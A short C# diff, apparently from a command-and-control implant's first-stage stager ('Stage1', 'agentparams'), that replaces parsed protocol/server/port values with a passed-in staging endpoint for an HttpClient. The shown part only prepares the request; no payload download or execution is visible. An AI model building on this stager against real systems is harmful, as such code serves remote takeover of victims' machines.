@@ -11,25 +11,21 @@ namespace Stage1
 {
     public static class Stage
     {
-        public static void Entry(string agentparams)
+        public static void Entry(string stagingEndpoint, string agentparams)
         {
 #if DEBUG
             Console.WriteLine(agentparams);
 #endif
-            var tab = agentparams.Split(':');
-            string protocol = tab[0];
-            string server = tab[1];
-            int port = int.Parse(tab[2]);
-
-
-
+           
 #if DEBUG
             Console.WriteLine("Creating request");
 #endif
+            if (!stagingEndpoint.EndsWith("/"))
+                stagingEndpoint += "/";
 
             HttpClient client = new HttpClient();
             client.Timeout = new TimeSpan(0, 0, 10);
-            client.BaseAddress = new Uri($"{protocol}://{server}:{port}/wh/");
+            client.BaseAddress = new Uri($"{stagingEndpoint}");
             client.DefaultRequestHeaders.Clear();
 
 
